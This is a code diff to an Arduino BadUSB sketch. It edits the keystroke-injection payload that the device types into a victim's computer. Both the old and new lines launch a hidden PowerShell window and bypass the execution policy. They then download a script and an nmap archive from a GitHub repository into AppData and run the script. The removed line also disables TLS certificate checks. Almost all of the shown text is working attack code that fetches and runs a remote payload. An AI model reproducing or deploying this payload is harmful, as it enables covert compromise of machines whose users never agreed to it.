@@ -21,7 +21,7 @@ void setup() {
   delay(2500);
 
   // enter deploy command
-  Keyboard.println("powershell.exe -WindowStyle Hidden -Command {add-type \"using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; }}\"; [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy; Set-ExecutionPolicy Bypass -Scope Process -Force; New-Item $env:APPDATA -Name \"Fairy\" -ItemType \"Directory\" -Force; Set-Location -Path \"$($env:APPDATA)\\Fairy\"; Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/fairy.ps1 -OutFile fairy.ps1; Invoke-WebRequest -Uri https://github.com/h3xagon0001/arduino-micro-badusb/raw/refs/heads/main/nmap.zip -OutFile nmap.zip; Expand-Archive -LiteralPath \"./nmap.zip\" -DestinationPath \"$($env:APPDATA)\\Fairy\" -Force; ./fairy.ps1}");
+  Keyboard.println("powershell.exe -WindowStyle Hidden -Command {Set-ExecutionPolicy Bypass -Scope Process -Force; New-Item $env:APPDATA -Name \"Fairy\" -ItemType \"Directory\" -Force; Set-Location -Path \"$($env:APPDATA)\\Fairy\"; Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/fairy.ps1 -OutFile fairy.ps1; Invoke-WebRequest -Uri https://github.com/h3xagon0001/arduino-micro-badusb/raw/refs/heads/main/nmap.zip -OutFile nmap.zip; Expand-Archive -LiteralPath \"./nmap.zip\" -DestinationPath \"$($env:APPDATA)\\Fairy\" -Force; ./fairy.ps1}");
   //////////// PAYLOAD END ////////////
   Keyboard.end();
 }
